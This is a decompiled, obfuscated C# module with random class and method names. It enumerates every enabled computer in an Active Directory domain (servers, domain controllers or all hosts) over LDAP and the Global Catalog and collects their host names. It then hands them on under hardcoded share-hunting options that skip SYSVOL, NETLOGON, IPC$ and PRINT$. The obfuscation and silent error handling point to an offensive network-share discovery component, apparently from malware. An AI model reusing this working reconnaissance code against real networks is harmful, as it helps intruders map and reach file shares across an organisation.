using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Linq;

namespace YzTymtbtgFABHvJvj;

internal class eTbJkXZrVbpMZIzh
{
	public static void ufZkawwYoqoU()
	{
		string[] kbndyqGWDec = new string[2] { "/ldap:all", "/filter:sysvol,netlogon,ipc$,print$" };
		List<string> list = new List<string>();
		Dictionary<string, string[]> zoSfzdVYfOOFBC = YOnJwbWHwMZ.CMfyRwRqJXXCG(kbndyqGWDec);
		YOnJwbWHwMZ.yAKvGgIxEaiOXmf yAKvGgIxEaiOXmf = YOnJwbWHwMZ.oMHFmMJjmwFI(zoSfzdVYfOOFBC);
		if (yAKvGgIxEaiOXmf == null || !YOnJwbWHwMZ.lGAfNSvKtXRjj(yAKvGgIxEaiOXmf))
		{
			return;
		}
		if (!string.IsNullOrEmpty(yAKvGgIxEaiOXmf.LDFXrFWUokPN))
		{
			List<string> list2 = gJDMFCuzAftO(yAKvGgIxEaiOXmf);
			if (list2 != null)
			{
				list = list.Concat(list2).ToList();
			}
		}
		if (!string.IsNullOrEmpty(yAKvGgIxEaiOXmf.EjlnaqEgPuPT))
		{
			List<string> list3 = IblQyrdiqPbTQVR(yAKvGgIxEaiOXmf);
			if (list3 != null)
			{
				list = list.Concat(list3).ToList();
			}
		}
		list = list.Distinct().ToList();
		FLnCjxXfKDRbOeF.LockTSlbun = list.Count;
		xzpVoIOaUnQqluDbk.ZfEGJlxsTfnbp(list, yAKvGgIxEaiOXmf);
	}

	public static List<string> gJDMFCuzAftO(YOnJwbWHwMZ.yAKvGgIxEaiOXmf agzzEEuGpgB)
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Expected O, but got Unknown
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_025f: Expected O, but got Unknown
		//IL_0261: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_026a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0271: Expected O, but got Unknown
		//IL_0273: Unknown result type (might be due to invalid IL or missing references)
		//IL_027a: Expected O, but got Unknown
		//IL_02c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		try
		{
			bool flag = true;
			List<string> list = new List<string>();
			string text = null;
			switch (agzzEEuGpgB.LDFXrFWUokPN)
			{
			case "servers-exclude-dc":
				flag = false;
				text = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(operatingSystem=*server*)(!(userAccountControl:1.2.840.113556.1.4.803:=8192))(!(userAccountControl:1.2.840.113556.1.4.803:=67100867)))";
				goto IL_008d;
			case "servers":
				flag = false;
				text = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(operatingSystem=*server*))";
				goto IL_008d;
			case "exclude-dc":
				text = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(userAccountControl:1.2.840.113556.1.4.803:=8192))(!(userAccountControl:1.2.840.113556.1.4.803:=67100867)))";
				goto IL_008d;
			case "dc":
				text = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=8192))";
				goto IL_008d;
			case "all":
				text = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
				goto IL_008d;
			default:
				{
					YOnJwbWHwMZ.EwTGLYKcUktaw();
					return null;
				}
				IL_008d:
				if (flag)
				{
					try
					{
						DirectoryEntry val = null;
						DirectorySearcher val2 = null;
						if (!string.IsNullOrEmpty(agzzEEuGpgB.aylPrjfGphlwc) && !string.IsNullOrEmpty(agzzEEuGpgB.njbbrVdHArM))
						{
							try
							{
								string text2 = string.Format("GC://{0}/DC={1}", agzzEEuGpgB.aylPrjfGphlwc, agzzEEuGpgB.njbbrVdHArM.Replace(".", ",DC="));
								val = new DirectoryEntry(text2);
								val2 = new DirectorySearcher(val);
							}
							catch (Exception)
							{
								string text2 = string.Format("LDAP://{0}/DC={1}", agzzEEuGpgB.aylPrjfGphlwc, agzzEEuGpgB.njbbrVdHArM.Replace(".", ",DC="));
								val = new DirectoryEntry(text2);
								val2 = new DirectorySearcher(val);
							}
						}
						else
						{
							Forest currentForest = Forest.GetCurrentForest();
							GlobalCatalog val3 = currentForest.FindGlobalCatalog();
							val2 = ((DomainController)val3).GetDirectorySearcher();
						}
						val2.get_PropertiesToLoad().Add("dnshostname");
						val2.set_Filter(text);
						val2.set_SizeLimit(int.MaxValue);
						val2.set_PageSize(int.MaxValue);
						foreach (SearchResult item2 in val2.FindAll())
						{
							SearchResult val4 = item2;
							try
							{
								string item = val4.get_Properties().get_Item("dnshostname").get_Item(0)
									.ToString()!.ToUpper();
								list.Add(item);
							}
							catch
							{
							}
						}
						((Component)(object)val2).Dispose();
					}
					catch (Exception)
					{
						if (agzzEEuGpgB.OpWhwQyfQRrcH)
						{
						}
					}
				}
				else
				{
					try
					{
						DirectoryEntry val = null;
						DirectorySearcher val5 = null;
						if (!string.IsNullOrEmpty(agzzEEuGpgB.aylPrjfGphlwc) && !string.IsNullOrEmpty(agzzEEuGpgB.njbbrVdHArM))
						{
							string text2 = string.Format("LDAP://{0}/DC={1}", agzzEEuGpgB.aylPrjfGphlwc, agzzEEuGpgB.njbbrVdHArM.Replace(".", ",DC="));
							val = new DirectoryEntry(text2);
							val5 = new DirectorySearcher(val);
						}
						else
						{
							val = new DirectoryEntry();
							val5 = new DirectorySearcher(val);
						}
						val5.get_PropertiesToLoad().Add("dnshostname");
						val5.set_Filter(text);
						val5.set_SizeLimit(int.MaxValue);
						val5.set_PageSize(int.MaxValue);
						foreach (SearchResult item3 in val5.FindAll())
						{
							SearchResult val4 = item3;
							try
							{
								string item = val4.get_Properties().get_Item("dnshostname").get_Item(0)
									.ToString()!.ToUpper();
								list.Add(item);
							}
							catch
							{
							}
						}
						((Component)(object)val5).Dispose();
					}
					catch (Exception)
					{
						if (agzzEEuGpgB.OpWhwQyfQRrcH)
						{
						}
					}
				}
				list.RemoveAll((string XCdLvxrnQExWBLi) => XCdLvxrnQExWBLi.Contains(Environment.MachineName.ToUpper()));
				return list;
			}
		}
		catch (Exception)
		{
			if (!agzzEEuGpgB.OpWhwQyfQRrcH)
			{
			}
			return null;
		}
	}

	public static List<string> IblQyrdiqPbTQVR(YOnJwbWHwMZ.yAKvGgIxEaiOXmf wbthVoFVjZon)
	{
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0107: Expected O, but got Unknown
		try
		{
			List<string> list = new List<string>();
			DirectoryEntry val = null;
			DirectorySearcher val2 = null;
			if (!string.IsNullOrEmpty(wbthVoFVjZon.aylPrjfGphlwc) && !string.IsNullOrEmpty(wbthVoFVjZon.njbbrVdHArM))
			{
				try
				{
					string text = string.Format("GC://{0}/DC={1}", wbthVoFVjZon.aylPrjfGphlwc, wbthVoFVjZon.njbbrVdHArM.Replace(".", ",DC="));
					val = new DirectoryEntry(text);
					val2 = new DirectorySearcher(val);
				}
				catch (Exception)
				{
					string text = string.Format("LDAP://{0}/DC={1}", wbthVoFVjZon.aylPrjfGphlwc, wbthVoFVjZon.njbbrVdHArM.Replace(".", ",DC="));
					val = new DirectoryEntry(text);
					val2 = new DirectorySearcher(val);
				}
			}
			else
			{
				string text2 = "LDAP://" + wbthVoFVjZon.EjlnaqEgPuPT;
				val = new DirectoryEntry(text2);
				val2 = new DirectorySearcher(val);
			}
			val2.get_PropertiesToLoad().Add("dnshostname");
			val2.set_Filter("(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))");
			val2.set_SizeLimit(int.MaxValue);
			val2.set_PageSize(int.MaxValue);
			foreach (SearchResult item2 in val2.FindAll())
			{
				SearchResult val3 = item2;
				string item = val3.get_Properties().get_Item("dnshostname").get_Item(0)
					.ToString();
				list.Add(item);
			}
			((Component)(object)val2).Dispose();
			((Component)(object)val).Dispose();
			return list;
		}
		catch (Exception)
		{
			if (!wbthVoFVjZon.OpWhwQyfQRrcH)
			{
			}
			return null;
		}
	}
}
